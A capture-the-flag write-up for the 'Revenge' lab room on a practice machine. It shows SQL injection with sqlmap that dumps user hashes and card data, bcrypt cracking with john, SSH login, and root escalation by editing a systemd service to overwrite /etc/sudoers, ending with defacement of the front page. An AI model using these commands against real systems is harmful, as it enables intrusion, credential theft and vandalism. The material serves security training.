# Revenge

## Description

You've been hired by Billy Joel to get revenge on Ducky Inc...the company that fired him. Can you break into the server and complete your mission?

## Task 1 - Message from Billy Joel

Billy Joel has sent you a message regarding your mission. Download it,read it and continue on.

Read through your mission and continue

We are provided with a txt file with a weird name. Let's read it to see what we have to do.

~~~
└─$ cat qTyAhRp.txt 
To whom it may concern,

I know it was you who hacked my blog.  I was really impressed with your skills.  You were a little sloppy 
and left a bit of a footprint so I was able to track you down.  But, thank you for taking me up on my offer.  
I've done some initial enumeration of the site because I know *some* things about hacking but not enough.  
For that reason, I'll let you do your own enumeration and checking.

What I want you to do is simple.  Break into the server that's running the website and deface the front page.  
I don't care how you do it, just do it.  But remember...DO NOT BRING DOWN THE SITE!  We don't want to cause irreparable damage.

When you finish the job, you'll get the rest of your payment.  We agreed upon $5,000.  
Half up-front and half when you finish.

Good luck,

Billy
~~~

No answer needed

## Task 2 - Revenge!

This is revenge! You've been hired by Billy Joel to break into and deface the Rubber Ducky Inc. webpage. He was fired for probably good reasons but who cares, you're just here for the money. Can you fulfill your end of the bargain?

There is a sister room to this one. If you have not completed [Blog](https://tryhackme.com/room/blog) yet, I recommend you do so. It's not required but may enhance the story for you.

All images on the webapp, including the navbar brand logo, 404 and 500 pages, and product images goes to [Varg](https://tryhackme.com/p/Varg). Thanks for helping me out with this one, bud.

Please hack responsibly. Do not attack a website or domain that you do not own the rights to. TryHackMe does not condone illegal hacking. This room is just for fun and to tell a story.

### Initial Scan

Let's deploy the machine and start. Let's start with an Nmap scan. The scan reveals two open ports:

* 22 ssh
* 80 http

~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:53:b7:7a:eb:ab:22:70:1c:f7:3c:7a:c7:76:d9:89 (RSA)
|   256 43:77:00:fb:da:42:02:58:52:12:7d:cd:4e:52:4f:c3 (ECDSA)
|_  256 2b:57:13:7c:c8:4f:1d:c2:68:67:28:3f:8e:39:30:ab (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Home | Rubber Ducky Inc.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Web

Let's head to the webpage and start our enumeration. I ran `gobuster` on the web page to find directories or files to work with:

~~~
└─$ gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://$IP:80/ -x php,js,txt,zip,html

[REDACTED]

/index                (Status: 200) [Size: 8541]
/contact              (Status: 200) [Size: 6906]
/products             (Status: 200) [Size: 7254]
/login                (Status: 200) [Size: 4980]
/admin                (Status: 200) [Size: 4983]
/static               (Status: 301) [Size: 194] [--> http://10.10.96.34/static/]
/requirements.txt     (Status: 200) [Size: 258]
~~~

I found a few directories and a file named `requirements.txt`. Let's read this file to see what the webapp is using:

~~~
└─$ curl -s "http://$IP:80/requirements.txt"
attrs==19.3.0
bcrypt==3.1.7
cffi==1.14.1
click==7.1.2
Flask==1.1.2                <----------
Flask-Bcrypt==0.7.1
Flask-SQLAlchemy==2.4.4
itsdangerous==1.1.0
Jinja2==2.11.2
MarkupSafe==1.1.1
pycparser==2.20
PyMySQL==0.10.0
six==1.15.0
SQLAlchemy==1.3.18
Werkzeug==1.0.1
~~~

Here we can see `flask` which is a python module. I added python extention to `gobuster` and ran it again:

~~~
└─$ gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://$IP:80/ -x py,txt

[REDACTED]

/index                (Status: 200) [Size: 8541]
/contact              (Status: 200) [Size: 6906]
/products             (Status: 200) [Size: 7254]
/login                (Status: 200) [Size: 4980]
/admin                (Status: 200) [Size: 4983]
/static               (Status: 301) [Size: 194] [--> http://10.10.96.34/static/]
/app.py               (Status: 200) [Size: 2371]                                
/requirements.txt     (Status: 200) [Size: 258]
~~~

We found a file named `app.py`. I downloaded the file using `wget` (`wget http://<MACHINE IP>/app.py`) and took a look at it.

### SQL Injection

This file is hosting the routes. There were many functions inside it, but this one looks vulnerable:

~~~py
# Product Route
# SQL Query performed here
@app.route('/products/<product_id>', methods=['GET'])
def product(product_id):
    with eng.connect() as con:
        # Executes the SQL Query
        # This should be the vulnerable portion of the application
        rs = con.execute(f"SELECT * FROM product WHERE id={product_id}")
        product_selected = rs.fetchone()  # Returns the entire row in a list
    return render_template('product.html', title=product_selected[1], result=product_selected)
~~~

This route is used for dynamic url and user input `product_id`, is directly used in the query sent to the database and that's what makes this part of the code exploitable, because there's no filter what so ever to block the malicious queries. 

I'm gonna use `sqlmap` to automate the injection process on `http://<MACHINE IP>//products/1`. First we should find the database currently being used by running the following command:

~~~
└─$ sqlmap -u http://$IP//products/1 --current-db --batch

[REDACTED]

[04:23:31] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.14.0
back-end DBMS: MySQL >= 5.0.12
[04:23:32] [INFO] fetching current database
current database: 'duckyinc'            <----------
~~~

We found the name of the database: `duckyinc`. By running the following command, we dump the data from this database:

~~~
└─$ sqlmap -u http://$IP//products/1 -D duckyinc --dump-all --batch

[REDACTED]

Database: duckyinc
Table: user
[10 entries]
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
| id | email                           | company          | username | _password                                                    | credit_card                |
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
| 1  | sales@fakeinc.org               | Fake Inc         | jhenry   | $2a$12$dAV7fq4KIUyUEOALi8P2dOuXRj5ptOoeRtYLHS85vd/SBDv.tYXOa | 4338736490565706           |
| 2  | accountspayable@ecorp.org       | Evil Corp        | smonroe  | $2a$12$6KhFSANS9cF6riOw5C66nerchvkU9AHLVk7I8fKmBkh6P/rPGmanm | 355219744086163            |
| 3  | accounts.payable@mcdoonalds.org | McDoonalds Inc   | dross    | $2a$12$9VmMpa8FufYHT1KNvjB1HuQm9LF8EX.KkDwh9VRDb5hMk3eXNRC4C | 349789518019219            |
| 4  | sales@ABC.com                   | ABC Corp         | ngross   | $2a$12$LMWOgC37PCtG7BrcbZpddOGquZPyrRBo5XjQUIVVAlIKFHMysV9EO | 4499108649937274           |
| 5  | sales@threebelow.com            | Three Below      | jlawlor  | $2a$12$hEg5iGFZSsec643AOjV5zellkzprMQxgdh1grCW3SMG9qV9CKzyRu | 4563593127115348           |
| 6  | ap@krasco.org                   | Krasco Org       | mandrews | $2a$12$reNFrUWe4taGXZNdHAhRme6UR2uX..t/XCR6UnzTK6sh1UhREd1rC | thm{br3ak1ng_4nd_3nt3r1ng} |
| 7  | payable@wallyworld.com          | Wally World Corp | dgorman  | $2a$12$8IlMgC9UoN0mUmdrS3b3KO0gLexfZ1WvA86San/YRODIbC8UGinNm | 4905698211632780           |
| 8  | payables@orlando.gov            | Orlando City     | mbutts   | $2a$12$dmdKBc/0yxD9h81ziGHW4e5cYhsAiU4nCADuN0tCE8PaEv51oHWbS | 4690248976187759           |
| 9  | sales@dollatwee.com             | Dolla Twee       | hmontana | $2a$12$q6Ba.wuGpch1SnZvEJ1JDethQaMwUyTHkR0pNtyTW6anur.3.0cem | 375019041714434            |
| 10 | sales@ofamdollar                | O!  Fam Dollar   | csmith   | $2a$12$gxC7HlIWxMKTLGexTq8cn.nNnUaYKUpI91QaqQ/E29vtwlwyvXe36 | 364774395134471            |
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+

[REDACTED]

Database: duckyinc
Table: system_user
[3 entries]
+----+----------------------+--------------+--------------------------------------------------------------+
| id | email                | username     | _password                                                    |
+----+----------------------+--------------+--------------------------------------------------------------+
| 1  | sadmin@duckyinc.org  | server-admin | $2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a |
| 2  | kmotley@duckyinc.org | kmotley      | $2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa |
| 3  | dhughes@duckyinc.org | dhughes      | $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |
+----+----------------------+--------------+--------------------------------------------------------------+
~~~

The result shows three tables: `product`, `user`, and `system_user`. The `product` table is useless to us, but the other two offer some good information.

### Flag 1

We can find the first flag in `user` table. It is located in `credit_card` column in front of user `mandrews`:

~~~
+----------+----------------------------+
| username | credit_card                |
+----------+----------------------------+
| jhenry   | 4338736490565706           |
| smonroe  | 355219744086163            |
| dross    | 349789518019219            |
| ngross   | 4499108649937274           |
| jlawlor  | 4563593127115348           |
| mandrews | thm{br3ak1ng_4nd_3nt3r1ng} |   <----------
| dgorman  | 4905698211632780           |
| mbutts   | 4690248976187759           |
| hmontana | 375019041714434            |
| csmith   | 364774395134471            |
+----------+----------------------------+
~~~

Flag 1: `thm{br3ak1ng_4nd_3nt3r1ng}`

### Connecting to SSH

In the dumped data, we can see many password hashes, but the ones that can be useful for us, are the ones found in `system_user` table:

~~~
server-admin:$2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a
kmotley:$2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa
dhughes:$2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK
~~~

I saved these hashes in a file and used `john` and `rockyou` wordlist to crack them:

~~~
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes  
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (bcrypt [Blowfish 32/64 X3])
Loaded hashes with cost 1 (iteration count) varying from 256 to 4096
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
inuyasha         (server-admin)
~~~

I was able to crack one of the hashes and now we have a username and password:

* Username: `server-admin`
* Password: `inuyasha`

Let's try the creds on the ssh service to see if we can access it or not:

~~~
└─$ ssh server-admin@$IP
server-admin@10.10.96.34's password:
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)

[REDACTED]

server-admin@duckyinc:~$ id
uid=1001(server-admin) gid=1001(server-admin) groups=1001(server-admin),33(www-data)
~~~

Great! The creds we found is valid.

### Flag 2

I listed the files in `server-admin`'s home directory and here we can find the second flag:

~~~
server-admin@duckyinc:~$ ls
flag2.txt
server-admin@duckyinc:~$ cat flag2.txt 
thm{4lm0st_th3re}
~~~

<!-- D0N'T ST1LL MY SH!T -->

Flag 2: `thm{4lm0st_th3re}`

### Privilege Escalation

First I listed `/home` to see the other users on the machine and turns out that there is only one:

~~~
server-admin@duckyinc:~$ ls /home/
server-admin
~~~

We probably need to gain root access directly from this user. I ran `sudo -l` to check my sudo permissions:

~~~
server-admin@duckyinc:~$ sudo -l
[sudo] password for server-admin: 
Matching Defaults entries for server-admin on duckyinc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User server-admin may run the following commands on duckyinc:
    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart
        duckyinc.service, /bin/systemctl daemon-reload, sudoedit /etc/systemd/system/duckyinc.service
~~~

As you can see, we can run a few options using `systemctl`. We can also use `sudoedit` on `/etc/systemd/system/duckyinc.service` to edit this file.

If you have seen privilege escalation using services before, you probably have an idea of what we need to do here. If you don't, [this blog](https://book.hacktricks.xyz/linux-unix/privilege-escalation) gives a really good explanation on this (Look for "Services" title).

We have two options here. The first one is to create a bash reverse shell in a file and then change the config to run that reverse shell on the reboot and since it is being run by sudo, we'll receive a root shell.

The second one which is what I'm gonna do, is to change the config file for sudoers (`/etc/sudoers`) and give user `server-admin` full sudo permissions. This one is more technical and more efficient, so here we go.

First we should use `sudoedit` to edit the config file for the service (`/etc/systemd/system/duckyinc.service`):

~~~
server-admin@duckyinc:~$ sudoedit /etc/systemd/system/duckyinc.service
~~~

Then we change the "ExecStart" which specifies the commands running after a reboot or boot, to change `/etc/sudoers`. We are going to change the "ExecStart" to the following:

~~~
ExecStart=/bin/bash -c 'echo "server-admin ALL=(root) NOPASSWD: ALL" > /etc/sudoers'
~~~

We also need to change "User" and "Group" to `root`, so all the commands would run by root. Now save the changes and the file should look like this:

~~~
server-admin@duckyinc:~$ cat /etc/systemd/system/duckyinc.service
[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
User=root
Group=root
WorkingDirectory=/var/www/duckyinc
ExecStart=/bin/sh -c 'echo "server-admin ALL=(root) NOPASSWD: ALL" > /etc/sudoers'
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s TERM $MAINPID

[Install]
WantedBy=multi-user.target
~~~

Now that we have modified the config file, we should reload systemd manager configuration. Then we restart duckyinc.service:

~~~
server-admin@duckyinc:~$ sudo /bin/systemctl daemon-reload
server-admin@duckyinc:~$ sudo /bin/systemctl restart duckyinc.service
~~~

Now let's check our sudo permissions using `sudo -l` to see if our exploit worked or not:

~~~
server-admin@duckyinc:~$ sudo -l
User server-admin may run the following commands on duckyinc:
    (root) NOPASSWD: ALL
~~~

It worked! Now we can simply run `sudo su` to switch to root:

~~~
server-admin@duckyinc:~$ sudo su
root@duckyinc:/home/server-admin# id
uid=0(root) gid=0(root) groups=0(root)
~~~

### Flag 3

Now that we are root, we can obtain the third flag. We can't find the third flag in `/root`, because we haven't finished the job yet. We still need to deface the front page. Let's head to `/var/www/duckyinc/templates`, where the main page is. Use `nano` or `vim` to edit `index.html`. Change any line you want.

Now a new file named `flag3.txt` is created in the root directory, which contains the final flag:

~~~
root@duckyinc:~# cat flag3.txt 
thm{m1ss10n_acc0mpl1sh3d}
~~~

Flag 3: `thm{m1ss10n_acc0mpl1sh3d}`

# D0N3! ; )

Thanks to the creators of this room!

Hope you had fun and learned something.

Have a g00d 0ne! : )